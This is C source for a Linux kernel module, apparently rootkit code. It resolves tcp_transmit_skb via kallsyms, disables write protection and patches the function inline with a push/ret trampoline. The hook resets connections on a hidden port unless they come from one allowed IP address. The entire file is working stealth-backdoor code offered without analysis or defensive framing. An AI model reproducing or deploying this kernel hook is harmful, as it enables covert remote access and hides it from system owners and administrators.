#include<linux/module.h>
#include<linux/moduleparam.h>
#include<linux/string.h>
#include<linux/inet_diag.h>
#include<linux/slab.h>
#include<linux/socket.h>
#include<linux/net.h>
#include<net/ip.h>
#include<net/sock.h>
#include<net/tcp.h>
#include<net/inet_sock.h>
#include<linux/skbuff.h>
#include<linux/inet.h>
#include<linux/kallsyms.h>
#include<linux/kernel.h>

#include "hooking.h"
#include "port_knocking.h"

#define dp() disable_wp()
#define wp() enable_wp()
#define HIJACK_LEN 6

static int (*orig_tcp_transmit_skb)(struct sock*, struct sk_buff*, int, gfp_t);
static int my_tcp_transmit_skb(struct sock*, struct sk_buff*, int, gfp_t);

static char transmit_skb_code[HIJACK_LEN];
static char hjc[HIJACK_LEN] = {0x68,0x0,0x0,0x0,0x0,0xc3};
static unsigned int *p_addr = (unsigned int*) (hjc+1);

static char * allowed_ip_str = "000.000.000.000";
static unsigned short hidden_port = 0;
static unsigned int allowed_ip = 0;

module_param(allowed_ip_str,charp,0);
module_param(hidden_port, short, 0);
MODULE_PARM_DESC(allowed_ip_str, "IP address format: XXX.XXX.XXX.XXX");
MODULE_PARM_DESC(hidden_port, "Hidden service port");

//move this to hooking.h
union address_conv_t {
	unsigned long d64;
	unsigned int d32[2];
	unsigned char d8[4];
} adc;

static spinlock_t hijack_lock = __SPIN_LOCK_UNLOCKED(hijack_lock);


/*
* 	Convert IP string to integer
*/
unsigned int ipstr_to_int(char* ip_str)
{
	int err;
	unsigned char ip[4];
	unsigned int ret;
	const char* end;

	err = in4_pton(ip_str, -1, ip, -1, &end);
	if (err == 0) {
		return -1;
	}
	
	ret = *((unsigned int*)ip);
	return ret;
}

void hijack_transmit_skb(void){
	adc.d64 = (unsigned long) my_tcp_transmit_skb;
	*p_addr = adc.d32[0];
	spin_lock(&hijack_lock);
	memcpy(transmit_skb_code, orig_tcp_transmit_skb, HIJACK_LEN); //save old code
	dp();
	memcpy(orig_tcp_transmit_skb, &hjc, HIJACK_LEN); //inject our code
	wp();
	spin_unlock(&hijack_lock);
}

static int my_tcp_transmit_skb(struct sock * sk, struct sk_buff *skb, int clone_it, gfp_t gfp_mask){
	int ret;
	struct inet_sock *inet;
	struct tcp_skb_cb *tcb;
	//check stuff
	
	inet = inet_sk(sk);
	tcb = TCP_SKB_CB(skb);
	
	if(ntohs(inet->inet_sport) == hidden_port){
		printk(KERN_INFO "hidden port knocked!\n");
		if(inet->inet_daddr == allowed_ip){
			printk(KERN_INFO "everything ok.\n");
		}
		else {
			tcb->tcp_flags &= ~TCPHDR_SYN;
			tcb->tcp_flags |= TCPHDR_ACK;
			tcb->tcp_flags |= TCPHDR_RST;
		}
	} 
//	printk(KERN_INFO "dp %d sp %d sa %pI4 da %pI4\n", ntohs(inet->inet_dport), ntohs(inet->inet_sport),&inet->inet_saddr,&inet->inet_daddr);
	//printk(KERN_INFO "flags: %x %d\n", tcb->tcp_flags);

	spin_lock(&hijack_lock);
	dp();
	memcpy(orig_tcp_transmit_skb, transmit_skb_code, HIJACK_LEN);
	ret = orig_tcp_transmit_skb(sk,skb,clone_it, gfp_mask);
	memcpy(orig_tcp_transmit_skb, &hjc, HIJACK_LEN);
	wp();
	spin_unlock(&hijack_lock);	

	return ret;
}

void no_knock(void){
	unsigned long * addr;

	printk(KERN_INFO "=================================\n");
	
	addr = (unsigned long *) kallsyms_lookup_name("tcp_transmit_skb");
	orig_tcp_transmit_skb = (int (*)(struct sock *,struct sk_buff*, int, gfp_t))addr;

	allowed_ip = ipstr_to_int(allowed_ip_str);	
	printk(KERN_INFO "allowed ip: %pI4\n", &allowed_ip);
	
	hijack_transmit_skb();
}


void come_in(void){
	spin_lock(&hijack_lock);
	dp();
	memcpy(orig_tcp_transmit_skb, transmit_skb_code, HIJACK_LEN);
	wp();
	spin_unlock(&hijack_lock);
}
